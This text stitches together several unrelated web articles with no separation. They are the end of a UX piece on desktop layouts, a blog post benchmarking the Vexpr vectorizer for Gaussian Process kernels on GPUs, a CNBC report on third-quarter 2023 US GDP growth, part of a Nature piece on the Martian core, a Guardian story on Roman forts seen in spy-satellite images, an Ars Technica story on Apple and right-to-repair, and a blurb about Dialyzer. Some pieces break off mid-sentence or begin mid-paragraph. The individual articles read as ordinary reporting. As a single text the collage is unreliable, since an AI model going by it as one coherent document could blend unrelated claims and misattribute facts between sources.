<li><strong>Keep critical, related content grouped together in the same viewport.</strong>&nbsp;Consider which information is most relevant to understanding the offering and choose designs that keep this content together to reduce back-and-forth scrolling.&nbsp;</li>
<li><strong>Avoid mobile-specific interactions and design elements.&nbsp;</strong>Limit the use of accordions on desktop and consider adaptive designs that display this content in desktop-friendly ways.</li>
<li><strong>Understand when dispersion can be used strategically&nbsp;</strong>to focus attention on key points or complex pieces of content.</li>
</ul>
<h2><a id="Conclusion" name="Conclusion"></a>Conclusion</h2>
<p>Minimalist desktop pages with dispersed content can limit distractions and focus attention on key points or complex pieces of information. However, an entire page that employs a mobile-first, minimalist, image-focused design creates usability issues on desktop. The page's content is stretched out and fragmented across viewports, becoming difficult to consume and understand.</p></section></div>]]></description>

      <article>
        

<p>In scientific computing, code is often naturally expressed as wide, tree-like expressions. Often different branches of that tree contain similar chunks of logic, so there is potential to run many different branches together in parallel vectorized operations. What happens when you take your nice tree-like code and mangle it into hard-to-read vectorized code? How would a person do that?</p>

<p>I created <a href="https://vexpr.org/">Vexpr</a> and used it to take <a href="https://probablymarcus.com/blocks/2022/11/30/hands-on-bayesian-optimization.html">real experiment</a> code and convert its <a href="https://github.com/outergroup/outer-loop-cookbook/blob/585b3b09fc7ac7f254a0cda8ef962670fb4f45fb/mnist_project/src/gp/vexpr_handson_gp.py#L55-L204">readable expressions</a> into <a href="https://probablymarcus.com/stuff/2023-10-19-vexpr-compiled-code.txt">vectorized expressions</a> at runtime. In this post, I present the results. Topics include:</p>

<ul>
  <li>What is the immediate impact?</li>
  <li>How does this relate to <code>torch.compile</code>?</li>
  <li>What is the more detailed breakdown of the impact on the GPU and CPU?</li>
</ul>

<h2 id="introduction-wide-expressions">Introduction: Wide expressions</h2>

<p>Mathematical expressions naturally form trees. Here’s a toy example.</p>

\[\sqrt{a^2 + b^2} + \sqrt{c^2 + d^2}\]

<p>Here’s Python code implementing this expression and highlighting its wide tree-like structure:</p>

<figure><pre><code data-lang="python"><span>sum</span><span>([</span><span>math</span><span>.</span><span>sqrt</span><span>(</span><span>sum</span><span>([</span><span>a</span> <span>**</span> <span>2</span><span>,</span>
                    <span>b</span> <span>**</span> <span>2</span><span>])),</span>
     <span>math</span><span>.</span><span>sqrt</span><span>(</span><span>sum</span><span>([</span><span>c</span> <span>**</span> <span>2</span><span>,</span>
                    <span>d</span> <span>**</span> <span>2</span><span>]))])</span></code></pre></figure>

<p>For this simple function, we can write vectorized PyTorch code by hand:</p>

<figure><pre><code data-lang="python"><span>torch</span><span>.</span><span>tensor</span><span>([</span><span>a</span><span>,</span> <span>b</span><span>,</span> <span>c</span><span>,</span> <span>d</span><span>]).</span><span>pow</span><span>(</span><span>2</span><span>).</span><span>view</span><span>((</span><span>2</span><span>,</span> <span>2</span><span>)).</span><span>sum</span><span>(</span><span>dim</span><span>=</span><span>0</span><span>).</span><span>sqrt</span><span>().</span><span>sum</span><span>()</span></code></pre></figure>

<p>The former code calls <code>pow</code> 4 times, calls <code>sum</code> twice, calls <code>sqrt</code> twice, then calls <code>sum</code> one last time. The latter code flattens the tree into a single pipeline so that one operation occurs for each <em>level</em> of the tree. Previously we ran one Python function call per <em>node</em> of the tree, and afterward we run one call per <em>level</em> of the tree – a number that is exponentially smaller.</p>

<p>PyTorch is often used in a pipelined way as shown above, but that’s usually because the expression is inherently <em>deep</em>; neural networks are the obvious example. Here we are concerned with expressions that are <em>wide</em>.</p>

<p>Imagine scaling up this toy example: use actual, larger expressions; let each variable represent a <em>list of vectors</em>, not just a number; within the expression, call functions like SciPy’s <code>cdist</code> which compute pairwise distances and return large matrices; do all of this on <em>batches</em> of inputs. With these changes, we now have a wide expression that is worth running on a GPU.</p>

<p>This scenario comes up often in scientific computing. For example, the kernel of a Gaussian Process (GP) takes in two lists of vectors and returns pairwise similarities. We <a href="https://probablymarcus.com/blocks/2022/11/30/hands-on-bayesian-optimization.html">can encode some of our intuition into these kernels</a> by composing them via weighted sums and products. This leads to giant tree-like expressions, and because those expressions have many similar operations in each parallel branch, there is a lot of potential for vectorization.</p>

<p>Writing vectorized code for giant expressions is hard, so I created <a href="https://vexpr.org/">Vexpr</a> to make it easy. Vexpr takes readable-but-slow PyTorch, NumPy, and JAX expressions and compiles them into fast, <a href="https://probablymarcus.com/stuff/2023-10-19-vexpr-compiled-code.txt">delightfully ugly</a> vectorized expressions.</p>

<h2 id="how-to-vectorize-one-level-of-an-expression-tree">How to vectorize one level of an expression tree</h2>

<p>Wide expressions naturally form a tree. When we vectorize that tree, we create a new narrower expression that invokes a series of Python functions, one for each level of the original tree.</p>

<div><p><img src="https://probablymarcus.com/images/2023-10-19-tree.svg" alt="Trees collapsing"></p><p>

How do we collapse a tree and reduce operations to be one per level? Each of the operations now will have to take in a tensor that contains every input to that level and return a tensor that contains all of the outputs.</p></div>

<p>We can see some operations already support such a change.</p>
<ul>
  <li>Elementwise operations like <code>pow</code> and <code>sqrt</code> can run on multiple inputs as-is.</li>
  <li>Parallel sums can be implemented as <code>.view(...).sum(dim=0)</code></li>
</ul>

<p>What about more difficult cases? For example, what if the parallel sums are of different lengths? On GPUs, fast parallel reductions only work when inputs all have the same length. Would providing a single-input single-output interface still have a benefit? The answer is yes, even if the operation internally just loops over the sums. Collapsing one level of the tree allows subsequent levels to be collapsed, and low-hanging fruit tends to appear in the deeper levels. Moreover, we can do better than looping over the sums, even when the lengths are different. Vexpr’s vectorizer groups the inputs by length and performs a reduced number of operations—one for each unique length. For example, this decreases the number of <code>torch.cdist</code> operations in my <a href="https://probablymarcus.com/blocks/2022/11/30/hands-on-bayesian-optimization.html">hands-on kernel</a> from 49 to 5. These 5 calls happen invisibly inside of a <code>cdist_multi</code> function that the code calls once.</p>

<p>These collapsed operations often introduce some overhead. Batch operations often require permuting tensors (e.g. for batched pairwise distances) or reordering values (e.g. putting equal-length sums next to each other). For operations that are grouped by size, we must split input tensors then re-concatenate the output tensors. Thus, while vectorizing has many benefits, it also introduces extra work for the GPU that is not necessary when using a non-vectorized expression. Is this overhead worth it? Let’s turn to experiments to find out.</p>

<h2 id="vectorizing-leads-to-4x-7x-speed-up-on-one-set-of-benchmarks">Vectorizing leads to 4x-7x speed-up on one set of benchmarks</h2>

<p>Here I run a pair of benchmarks on an NVIDIA V100 GPU. I describe the benchmarks within the context of real Gaussian Process use cases, but you don’t need to understand Gaussian Processes to understand these results; I am simply running <a href="https://probablymarcus.com/stuff/2023-10-19-vexpr-compiled-code.txt">this big vectorized expression</a> on inputs of different shapes.</p>

<p>When you use Gaussian Processes for Bayesian Optimization, you first fit a GP’s parameters to the training data, then you optimize a set of candidate points to maximize expected improvement. Both of these steps include backpropagating gradients through the GP kernel.</p>

<p><strong>Benchmark 1:</strong> Fit the kernel’s parameters. I run the forward and backward pass of the kernel, using <code>x1.shape == x2.shape == (379, 26)</code>, i.e. a training set of 379 26-dimensional vectors. I repeat 100 times, then wait for a final CUDA synchronize. I test with and without <code>torch.compile</code>.</p>

<strong>Benchmark 2:</strong> The optimization loop. In this experiment, <code>x1.shape == (60, 2, 26)</code> and <code>x2.shape == (60, 381, 26)</code>. That means we’re searching for 60 single candidate points, with an additional point included in each (hence the 2, not 1) because the Noisy Expected Improvement algorithm also gets predictions for a set of previous potentially best points. These two points are appended to 379 training points to give us 381 points. Again I run the kernel’s forward and backward pass 100 times.</p>

In these experiments, vectorizing my kernel caused a 4x speed-up when I used <code>torch.compile</code>, and a ~7x speed-up with straight pytorch code.</p>

<h2 id="but-this-speed-up-doesnt-happen-in-all-benchmarks">…but this speed-up doesn’t happen in all benchmarks</h2>

<p>Now I test the kernel’s performance in another scenario: hold-one-out cross-validation. During cross-validation, we fit \(N\) models on \(N\) slightly different datasets. We can test this by just rerunning Benchmark 1 on \(N\) models in parallel. To demonstrate a surprising phenomenon, I set \(N=20\).</p>

<p><strong>Benchmark 3:</strong> Cross-validation. Repeat Benchmark 1, but train 20 models in parallel rather than 1. So we have <code>x1.shape == x2.shape == (20, 379, 26)</code>, and the shapes of every parameter, e.g. <code>lengthscale</code>,  have <code>(20,)</code> prepended to them.</p>

<p><br>
This result surprised me. The vectorized version is sometimes <em>slower</em> than the baseline, at least when you examine only the GP kernel in an isolated benchmark. The end-to-end performance of the larger system is still often faster due to the freed up CPU (see next section), but it is noteworthy that vectorizing code doesn’t always directly speed up that code.</p>

<p>To understand where the change occurs, I rerun this benchmark for different \(N\). Note that \(N=1\) and \(N=20\) correspond to the original Benchmark 1 and Benchmark 3 results, respectively. I used the same hardware, but I enabled some additional profiling, hence the slower times compared to above.</p>

<p><img src="https://probablymarcus.com/images/2023-10-19-benchmark_fit_VexprHandsOnGP_benchmarkonly.svg" alt="Benchmark showing diminishing improvement from vectorization"></p>

<p>The vectorized kernel initially has a huge advantage over the baseline, but this advantage diminishes as we give it more parallel work, and without <code>torch.compile</code> the vectorized kernel is eventually <em>slower</em> when viewed in isolation. Why does this happen?</p>

<h2 id="the-cpu-is-a-bottleneck-vectorizing-removes-that-bottleneck">The CPU is a bottleneck. Vectorizing removes that bottleneck.</h2>

<p>To really understand the performance impact of vectorization, we need to understand the CPU and GPU usage before and after. First, note that CUDA / PyTorch are built on an asynchronous relationship between the CPU and GPU, where the CPU ideally should always run ahead, always queueing the GPU’s future work, while the GPU is always working through its queue. However, there are two events that cause the CPU to wait for the GPU:</p>

<ol>
  <li>When the CPU chooses to read a value from the GPU. This is a decision made by your code.</li>
  <li>When the CPU gets too far ahead of the GPU. This is a decision made by CUDA.</li>
</ol>

<p>I <a href="https://github.com/outergroup/outer-loop-cookbook/blob/585b3b09fc7ac7f254a0cda8ef962670fb4f45fb/mnist_project/profile_performance_test.sh#L86">profiled the kernel using NVIDIA’s <code>nsys</code></a>, and I used that trace to obtain GPU and CPU active time. My so-called CPU “active” time is actually an inferred value; CUDA spins the CPU 100% constantly, even when the CPU is just waiting for the GPU, so I use <a href="https://github.com/outergroup/outer-loop-cookbook/blob/585b3b09fc7ac7f254a0cda8ef962670fb4f45fb/mnist_project/print_nsys_stats.py#L94">heuristics</a> to detect these waits and subtract it them from the actual active time.</p>

<p>Here is the same plot from above, but with the CPU and GPU time overlaid.</p>

<p><img src="https://probablymarcus.com/images/2023-10-19-benchmark_fit_VexprHandsOnGP.svg" alt="Benchmark with CPU and GPU time included. The baseline is CPU-bound until we reach larger input sizes."></p>

<p>First, to understand the result of Benchmark 1 above, look at the left side of both plots. Both the baseline and vectorized models have low total active GPU time. But the baseline model puts a much larger workload on the CPU, which is responsible for orchestrating the set of operations that are sent to the GPU. Thus, the GPU spends the vast majority of the time idle, waiting for the CPU to give it more work. For the vectorized model the amount of CPU work is almost always less than the amount of GPU work, so the GPU is almost never idle; the benchmark time is roughly equal to the GPU active time.</p>

<p>Now we focus on the surprising result from Benchmark 3, where the baseline model did slightly <em>better</em> than the vectorized model. As we scale up the number of models, we see an interesting phenomenon. When training many models simultaneously, even the baseline model is able to keep the GPU busy. Once the GPU active time exceeds CPU active time. one of the key selling points of vectorized code is eliminated, because the nonvectorized code becomes good enough. This was a fun, surprising fact; even unvectorized code can outrun the GPU if you pass in large enough tensors. I expect this phenomenon to occur in other large-batch scenarios like training on very large datasets or doing Bayesian Optimizations with very large sets of candidate points. Of course, the vectorized code is still superior when using <code>torch.compile</code>, and in all cases its CPU usage is far superior.</p>

<p>Finally, let’s look at the GPU workload. Independent of the effect on CPU, what is the impact of vectorization on the total amount of work that the GPU has to do? Looking at slopes of the “GPU time” lines, we see that for some models, e.g. my non-compiled model, vectorization increases the total workload, and for other models it decreases the workload. I studied the CUDA traces closely and found that vectorization does indeed reduce many aspects of the GPU workload, greatly reducing the number of operations and decreasing the total amount of time spent on the fundamental computations of the algorithm. However it also introduces overhead (mentioned above) by interspersing operations that permute and reorder the tensors, or splitting them into groups then concatenating results. Sometimes the reduced “fundamental” time outweighs the additional overhead, while other times the overhead outweighs the reduction in fundamental time.</p>

<p>So we see that vectorization has three effects:</p>
<ol>
  <li>It lets us keep the GPU busy even when inputs are small.</li>
  <li>It frees up the CPU to do other work.</li>
  <li>It can slightly change the total amount of GPU work, sometimes for the worse.</li>
</ol>

<p>The speed-up from vectorization can be great, but it can be underwhelming in scenarios where none of the benefits are needed.</p>

<h2 id="the-benefits-of-vectorization-increase-as-gpu-speed-increases">The benefits of vectorization increase as GPU speed increases</h2>

<p>Here is a point that follows naturally from everything above, but it might not be immediately obvious. It is quite striking when you experience it.</p>

<p>As I built Vexpr, I tested on an NVIDIA T4. Then for this experiment, I upgraded to a much-faster NVIDIA V100, and the benefits of vectorization greatly improved.</p>

<p>You always want your CPU to stay ahead of the GPU so that the GPU is never idle. Code that is good enough to stay ahead of this year’s GPU might not be good enough for next year’s GPU. With each upgrade, you need the dotted CPU line from these charts to be lower and lower.</p>

<p>This means that vectorizing your code is good strategy for future-proofing it.</p>

<h2 id="gpytorchs-structure-kernels-show-similar-results">GPyTorch’s “structure” kernels show similar results</h2>

<p>I also tested GPyTorch’s limited support for vectorization. GPyTorch lets you take sets of identically-shaped kernels and run them as a single vectorized kernel. This capability is easy to use when summing single-feature kernels, so I created a partially vectorized kernel by <a href="https://github.com/outergroup/outer-loop-cookbook/blob/585b3b09fc7ac7f254a0cda8ef962670fb4f45fb/mnist_project/src/gp/botorch_partial_handson_gp.py#L43">replacing sums of single-feature Matern kernels with single Additive Structure</a> kernels.</p>

<p><img src="https://probablymarcus.com/images/2023-10-19-benchmark_fit_BotorchPartialHandsOnGP.svg" alt="Benchmark showing vectorized version is faster than baseline, but this advantage goes away at higher input sizes"></p>

<p><em>(Don’t focus too much on comparing absolute speed of the Vexpr and the GPyTorch kernels. There are many small differences between the two that have nothing to do with vectorization. For example, unlike my Vexpr kernel, GPyTorch has a nice optimization of putting <a href="https://github.com/cornellius-gp/gpytorch/blob/43383c2411569bfd3e4417a3918cf53f2c9dbe40/gpytorch/kernels/kernel.py#L492">this line</a> before <a href="https://github.com/cornellius-gp/gpytorch/blob/43383c2411569bfd3e4417a3918cf53f2c9dbe40/gpytorch/kernels/kernel.py#L506">this line</a>.)</em></p>

<p>Vexpr has been optimized much more for this use case than GPyTorch, but we see that the same fundamental phenomena occur. Vectorization leads to wins at small batch sizes, but the advantage diminishes at large batch sizes. In this experiment, vectorization increased the total GPU workload, so with large batch sizes the only advantage of vectorization is a freed up CPU.</p>

<p>Interestingly, neither GPyTorch kernel ever reaches a point where GPU time is equal to the benchmark time. The GPU always spends at least 1-2 seconds idle. This happens because GPyTorch’s kernels do a <a href="https://github.com/cornellius-gp/gpytorch/blob/43383c2411569bfd3e4417a3918cf53f2c9dbe40/gpytorch/kernels/kernel.py#L345">synchronous equality check</a> on every call, forcing a GPU synchronize, which causes the CPU to fall behind the GPU immediately afterward. So when you use GPyTorch kernels on GPUs, you don’t get the ideal fully asynchronous execution that you’re supposed to get with CUDA / PyTorch. (There is good news: PyTorch has recently introduced <a href="https://pytorch.org/docs/stable/generated/torch.cuda.set_sync_debug_mode.html"><code>torch.cuda.set_debug_mode(2)</code></a> which detects these unwanted synchronize events. Like <a href="https://x.com/ID_AA_Carmack/status/1616525615041216513?s=20">others</a>, I think every PyTorch library developer should become friends with this API.)</p>

<h2 id="closing-thoughts-on-compilation">Closing thoughts on compilation</h2>

<p>Everybody agrees that vectorization is good. Is it worth doing even in cases where it requires extra work, like with wide expressions? The results above suggest: most of the time, yes, but with interesting nuances. Vectorization is especially great for making the most of a GPU when your task is running many iterations on smaller batches of input data. For larger-batch scenarios, maybe you’ll only benefit from vectorization after you add JIT compilation, or after you upgrade your GPU, or after you’ve found some use for all the newfound idle CPU time. But, to a first approximation, vectorization is good.</p>

<p>The real open question for the field remains: for “wide” computation graphs, what is a practical strategy for getting vectorized code?</p>

<p>My experiments above show that this is not solved by JIT tools like <code>torch.compile</code>, nor do I expect it to be. I think a compiler would need to become a huge slow unreliable hairball to solve this type of auto-vectorization problem. Vexpr’s vectorizer is a compiler that solves this, but <strong>it does so by making the programmer meet the compiler in the middle</strong>. The programmer gives Vexpr a tree-like expression and tells Vexpr, “You should try vectorizing this.” Both of those pieces of information are valuable: the programmer structures the logic in a certain way, and the programmer indicates that there is opportunity for vectorization there. The programmer doesn’t need to do anything too difficult, and neither does the compiler.</p>

<p>I think this “meet-in-the-middle” approach between programmer and compiler is a good design principle that leads to good systems. And I think this will become even more true in the age of Large Language Models; rather than cramming too much magic into our compilers, let’s rely on humans-with-LLMs to meet the compiler in the middle.</p>

<div id="readability-page-1" class="page"><div><p>The U.S. economy grew even faster than expected in the third quarter, buoyed by a strong consumer in spite of higher interest rates, ongoing inflation pressures, and a variety of other domestic and global headwinds.</p><p>Gross domestic product, a measure of all goods and services produced in the U.S., rose at a seasonally adjusted 4.9% annualized pace in the July-through-September period, up from an unrevised 2.1% pace in the second quarter, the <a href="https://www.bea.gov/news/2023/gross-domestic-product-third-quarter-2023-advance-estimate" target="_blank">Commerce Department reported</a> Thursday.. Economists surveyed by Dow Jones had been looking for a 4.7% acceleration in GDP, which also is adjusted for inflation.</p></div><div><p>The sharp increase came due to contributions from consumer spending, increased inventories, exports, residential investment and government spending.</p><p>Consumer spending, as measured by personal consumption expenditures, increased 4% for the quarter after rising just 0.8% in Q2, and was responsible for 2.7 percentage points of the total GDP increase. Inventories contributed 1.3 percentage points. Gross private domestic investment surged 8.4% and government spending and investment jumped 4.6%.</p><p>Spending at the consumer level split fairly evenly between goods and services, with the two measures up 4.8% and 3.6%, respectively.</p><p>The GDP increase marked the biggest gain since the fourth quarter of 2021.</p><p><a href="https://www.cnbc.com/2023/10/25/stock-market-today-live-updates.html">Markets reacted little</a> to the news, with stocks mixed in early trading and Treasury yields mostly lower.</p><p>"This report confirmed what we already knew: The consumer went on a shopping spree in the third quarter," said Michael Arone, chief investment strategist for U.S. SPDR Business at State Street Global Advisors. "I don't think anything in this report changes the outlook for monetary policy. That's why I don't think you're seeing an overreaction from markets."</p><p>While the report could give the Federal Reserve some impetus to keep policy tight, traders were still pricing in no chance of an interest rate hike when the central bank meets next week, according to CME Group data. Futures pricing pointed to just a 27% chance of an increase at the December meeting following the GDP release.</p><p>"Investors should not be surprised that the consumer was spending in the final months of the summer," said Jeffrey Roach, chief economist at LPL Financial. "The real question is if the trend can continue in the coming quarters, and we think not."</p><p>In other economic news Thursday, the <a href="https://www.dol.gov/ui/data.pdf" target="_blank">Labor Department reported</a> that jobless claims totaled 210,000 for the week ended Oct. 21, up 10,000 from the previous period and slightly ahead of the Dow Jones estimate for 207,000. Also, <a href="https://www.census.gov/manufacturing/m3/adv/pdf/durgd.pdf" target="_blank">durable goods orders</a> increased 4.7% in September, well ahead of the 0.1% gain in August and the 2% forecast, according to the Commerce Department.</p><p>At a time when many economists had thought the U.S. would be in the midst of at least a shallow recession, growth has kept pace due to consumer spending that has exceeded all expectations. The consumer was responsible for about 68% of GDP in Q3.</p><p>While the U.S. has proven resilient to the various challenges, most economists expect growth to slow considerably in the coming months. However, they generally think the U.S. can skirt a recession absent any other unforeseen shocks.</p><p>"Going forward, the consumer's not going to spend at the same rate, the government is not going to spend at the same rate, and businesses seem to be slowing down their spending as well," Arone said. "This suggests this might be the peak GDP figure, at least in the next few quarters."</p><p>Even with Covid-era government transfer payments running out, spending has been strong as households draw down savings and ramp up credit card balances. The personal saving rate declined to 3.8% in the third quarter, compared to 5.2% in the previous period. Also, real after-tax income fell 1% in the quarter after increasing 3.5% in Q2.</p><p>The GDP gains also come despite the Federal Reserve not only raising rates at the fastest clip since the early 1980s but also vowing to keep rates high until inflation comes back to acceptable levels. Price increases have been running well ahead of the central bank's 2% annual target, though the rate of inflation at least has ebbed in recent months.</p><p>The chain-weighted price index, which takes into accounts changes in consumer shopping patterns to gauge inflation, rose 3.5% for the quarter, up from 1.7% in Q2 and higher than the Dow Jones estimate for 2.5%.</p><p>"The bottom line for the Federal Reserve is that no recession is in sight, and policymakers can be content in the knowledge that they can keep interest rates higher for longer, without triggering a meltdown in the U.S. economy," said Matthew Ryan, head of market strategy at Ebury, a global financial services firm. "We don't think that this impressive GDP data will be enough to encourage the Fed to deliver another rate increase, though we do at least believe that the first cut is a long way off."</p><p>Along with rates and inflation, consumers have been dealing with a variety of other issues.</p><p>The resumption of student loan payments is expected to take a bite out of household budgets, while elevated gas prices and a wobbly stock market are hitting confidence levels. Geopolitical tensions also pose potential headaches, with <a href="https://www.cnbc.com/2023/10/26/israel-hamas-war-updates-and-latest-news-on-gaza-conflict.html">fighting between Israel and Hamas</a> and the war in Ukraine posing substantial uncertainties about the future.</p><p><em><strong>Don't miss these CNBC PRO stories:</strong></em></p><ul><li><a href="https://www.cnbc.com/2023/10/16/want-to-retire-in-5-years-heres-how-to-invest-for-it-according-to-the-pros.html"><em>Want to retire in 5 years?

Seismic waves produced by quakes or impacts can slow down or speed up depending on what types of material they are travelling through, so seismologists can measure the waves’ passage to deduce what the interior of a planet looks like. On Earth, researchers have used information from earthquakes to discover the planet’s layers: a brittle outer crust, a mostly solid mantle, and a liquid outer core and a solid inner core. Finding out whether other planets have similar layers is key to understanding their geological history, including whether they were ever suitable for life.</p><p>InSight’s seismometer was the first to detect marsquakes. In July 2021, on the basis of the mission’s observations of 11 quakes, researchers reported that the liquid core of Mars seemed to have a radius of around 1,830 kilometres<sup><a href="#ref-CR3" data-track="click" data-action="anchor-link" data-track-label="go to reference" data-track-category="references">3</a></sup>. <a href="https://www.nature.com/articles/d41586-021-00696-7" data-track="click" data-label="https://www.nature.com/articles/d41586-021-00696-7" data-track-category="body text link">That was bigger than many scientists were expecting</a>. And it suggested that the core contained surprisingly high amounts of light chemical elements, such as sulfur, mixed with iron.</p><p>But the September 2021 meteorite impact “unlocked everything”, says Henri Samuel, a geophysicist at the Institute of Earth Physics of Paris and lead author of one of today’s papers<sup><a href="#ref-CR1" data-track="click" data-action="anchor-link" data-track-label="go to reference" data-track-category="references">1</a></sup>. The meteorite struck the planet on the side opposite to where InSight was located. That’s much more distant than the marsquakes that InSight had previously studied, and allowed the probe to detect seismic energy travelling all the way through the Martian core<sup><a href="#ref-CR4" data-track="click" data-action="anchor-link" data-track-label="go to reference" data-track-category="references">4</a></sup>. “We were so excited,” says Jessica Irving, a seismologist at the University of Bristol, UK, and a co-author of Samuel’s paper.</p><h2>Puzzle solving</h2><p>For Samuel, it was an opportunity to test his idea that a molten layer of rock surrounds Mars’s core<sup><a href="#ref-CR5" data-track="click" data-action="anchor-link" data-track-label="go to reference" data-track-category="references">5</a></sup>. The way the seismic energy traversed the planet showed that what scientists had thought was the boundary between the liquid core and the solid mantle, 1,830 kilometres from the planet’s centre, was actually a different boundary between liquid and solid. It was the top of the newfound layer of molten rock meeting the mantle (see ‘Rethinking the Martian core’). The actual core is buried beneath that molten-rock layer and has a radius of only 1,650 kilometres, Samuel says.</p><figure>

The work analysed seismic waves from the same distant meteorite impact, as well as simulations of the properties of mixtures of molten elements such as iron, nickel and sulfur at the high pressures and temperatures in the Martian core.

<div id="readability-page-1" class="page"><div id="maincontent"><p>Declassified cold-war spy satellite images have thrown new light on the workings of the Roman empire by revealing hundreds of previously undiscovered forts, with dramatic implications for our understanding, experts have said.</p><p>Archaeologists examining aerial photographs taken in the 1960s and 70s said they reveal 396 sites of unknown Roman forts in <a href="https://www.theguardian.com/world/syria" data-link-name="in body link" data-component="auto-linked-tag">Syria</a> and Iraq across the Syrian steppe.</p><p>The findings, <a href="https://doi.org/10.15184/aqy.2023.153" data-link-name="in body link">published today in Antiquity</a>, an international archeology academic journal, have now forced a re-evaluation of life at the Roman frontier.</p><p>A previous survey of the region in 1934 by Antoine Poidebard, a French Jesuit explorer who pioneered aerial archeology in the Middle East from his bi-plane, recorded a line of 116 forts.</p><p>Until now, historians assumed these forts were part of a defensive line built to protect the eastern province of the empire from Arab and Persian incursions, and from nomadic marauding tribes intent on captive-taking and slave-raiding.</p><p>The new discoveries instead point to the frontier being more fluid and a vibrant place of cross-border trade, rather than of constant violent conflict, the authors said, with the forts supporting a system of caravan-based interregional trade, communication and military transport.</p><p>The authors said it now raises the question: “Was it a wall or a road?”</p><p>“Since the 1930s, historians and archeologists have debated the strategic or political purpose of this system of fortifications,” said the lead author of <a href="https://doi.org/10.15184/aqy.2023.153" data-link-name="in body link">the research, </a>Prof Jesse Casana, of Dartmouth college in New Hampshire, US. “But few scholars have questioned Poidebard’s basic observation that there was a line of forts defining the eastern Roman frontier.”</p><p>The 396 new sites, hidden by modern-day development, are widely distributed across the region from east to west, which does not support the argument that the forts constituted a north-south border wall.</p><p>Researchers now hypothesise that the forts were constructed to support cross-border trade, protecting caravans travelling between the eastern provinces and the non-Roman territories, as well as facilitating communications between east and west.</p><p>Significantly, this indicates that the borders of the Roman world were less rigidly defined and exclusionist than previously believed, said the authors.</p><p>The Romans were a military society, but they clearly valued trade and communication with regions not under their direct control, they added.</p><p>The images studied formed part of the world’s first spy-satellite programme conducted at the time of geopolitical tension between the US and Soviet Union and their allies, the western bloc and the eastern bloc.</p><p>They “preserve a high-resolution, stereo perspective on a landscape that has been severely impacted by modern-day land-use change,” said Casana.</p><p>He said it revealed the real value of satellite imagery for recording archeological features before they are lost.</p><p>“We were only able confidently to identify extant archeological remains of 38 of Poidebard’s 116 forts. In addition, many of the likely Roman forts we have documented in this study have already been destroyed by recent urban or agricultural development, and countless others are under extreme threat.”</p><p>As more imagery is declassified, such as U2 spy plane photographs, more new archeological discoveries will be able to be made. Casana said “careful analysis of these powerful data holds enormous potential for future discoveries in the near east and beyond”.</p></div></div>]]></description>

<p>Right-to-repair advocates have long stated that passing repair laws in individual states was worth the uphill battle. Once enough states demanded that manufacturers make parts, repair guides, and diagnostic tools available, few companies would want to differentiate their offerings and policies and would instead pivot to national availability.</p>
<p>On Tuesday, Apple did exactly that. Following <a href="https://arstechnica.com/gadgets/2023/09/calif-passes-strongest-right-to-repair-bill-yet-requiring-7-years-of-parts/">the passage of California's repair bill</a> that <a href="https://arstechnica.com/gadgets/2023/08/hell-freezes-over-as-apple-supports-right-to-repair-bill/">Apple supported</a>, requiring seven years of parts, specialty tools, and repair manual availability, Apple <a href="https://www.reuters.com/technology/apple-make-tools-parts-fix-phones-computers-available-nationwide-white-house-2023-10-24/?ref=biztoc.com">announced Tuesday</a> that it would back a similar bill on a federal level. It would also make its parts, tools, and repair documentation available to both non-affiliated repair shops and individual customers, "at fair and reasonable prices."</p>
<p>"We intend to honor California's new repair provisions across the United States," said Brian Naumann, Apple's vice president for service and operation management, at <a href="https://www.youtube.com/watch?v=Ug3DkX7VRy8">a White House event Tuesday</a>.</p>
<p>Apple, which had for years opposed right-to-repair laws under the auspices of <a href="https://arstechnica.com/tech-policy/2017/03/industry-and-apple-opposing-right-to-repair-laws/">security</a> and <a href="https://www.vice.com/en/article/wjvdb4/apple-is-telling-lawmakers-people-will-hurt-themselves-if-they-try-to-fix-iphones">physical safety concerns</a>, has recently offered both an <a href="https://arstechnica.com/gadgets/2019/08/apple-gives-third-party-repair-shops-more-access-to-authorized-parts/">independent repair program for unaffiliated shops</a>&nbsp;and <a href="https://arstechnica.com/gadgets/2022/04/apple-launches-self-service-repair-program-for-iphone-users-in-the-us/">a self-service repair program</a> for individuals.</p>
<p>Apple's pledge was part of <a href="https://www.whitehouse.gov/briefing-room/statements-releases/2023/10/25/readout-of-the-white-house-convening-on-right-to-repair/">a White House push</a> on right-to-repair issues. The Biden administration has <a href="https://arstechnica.com/tech-policy/2021/07/bidens-right-to-repair-order-could-stop-companies-from-blocking-diy-fixes/">pushed right-to-repair needs</a> as a consumer issue, focusing on raised costs and stifling small businesses. Nationwide repair bills have been introduced before but have yet to gain much momentum. Apple's support for such a bill could have an impact, especially if other manufacturers follow suit in matching their national policy to California's law.</p>                                            
                                                        
<p>"I think most OEMs [Original Equipment Manufacturers] will realize they can save themselves a lot of trouble by making parts, tools, and other requirements of state laws already in NY, MN, CA, and CO available nationally," wrote Gay Gordon-Byrne, <span>executive director of <a href="http://repair.org/">The Repair Association</a></span>, to Ars. "If they try to differentiate between selling one type of product in New York and a different one in neighboring Pennsylvania—the border is porous, and they will only create more complexity in their distribution network than they would gain."</p>
<p>Gordon-Byrne noted that firms like HP, Google, Samsung, and Lenovo have pledged to comply with repair rules on a national level. The US Public Interest Research Group (PIRG) communicated a similarly hopeful note in <a href="https://pirg.org/media-center/statement-apple-announces-it-will-comply-with-californias-right-to-repair-rules-nationwide/">its response to Tuesday's event</a>, noting that "Apple makes a lot of products, and its conduct definitely influences other manufacturers."</p>
<p>At the same time, numerous obstacles to repair access remain in place through copyright law—"Which we hope will be high on an agenda in the <a href="https://judiciary.house.gov/subcommittees/committee-judiciary/subcommittee-courts-intellectual-property-and-internet">IP subcommittee</a> this session," Gordon-Byrne wrote.</p>
<p>Elizabeth Chamberlain, director of sustainability for <a href="http://ifixit.com/">iFixit</a>, a parts vendor and repair advocate, suggested that Apple's pledge to extend California's law on a national level is "a strategic move." "Apple likely hopes that they will be able to negotiate out the parts of <a href="https://arstechnica.com/gadgets/2023/05/minnesota-enacts-right-to-repair-law-that-covers-more-devices-than-any-other-state/">the Minnesota bill</a> they don't like," Chamberlain wrote in an email, pointing specifically to the "fair and reasonable" parts provisioning measure that could preclude Apple's tendency toward pairing parts to individual devices.</p>
<p>"[I]t's vital to get bulletproof parts pairing prohibitions passed in other states in 2024," Chamberlain wrote. "Independent repair and refurbishment depend on parts harvesting."</p>
<p>Ars reached out to Apple for comment on this story and will update the post with any new information.</p>

Dialyzer is a static analysis tool that identifies software discrepancies,  such as definite type errors, code that has become dead or unreachable  because of programming error, and unnecessary tests,  in single Erlang modules or entire (sets of) applications.
